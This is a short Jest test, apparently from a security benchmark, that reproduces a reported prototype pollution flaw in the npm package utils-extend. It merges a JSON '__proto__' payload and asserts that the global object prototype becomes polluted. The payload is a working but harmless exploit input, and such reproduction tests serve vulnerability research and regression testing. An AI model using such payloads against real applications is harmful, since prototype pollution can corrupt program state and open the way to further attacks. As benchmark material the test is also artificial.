//https://hackerone.com/reports/801522

test("prototype pollution in utils-extend", () => {
  const { extend } = require("utils-extend");
  const payload = process.env.SECBENCH_PAYLOAD || (process.env.SECBENCH_PAYLOAD || '{"__proto__":{"polluted":"yes"}}');
  obj = {};

  expect({}.polluted).toBe(undefined);

  const pollutionObject = JSON.parse(payload);
  extend({}, pollutionObject);

  expect({}.polluted).toBe("yes");
});
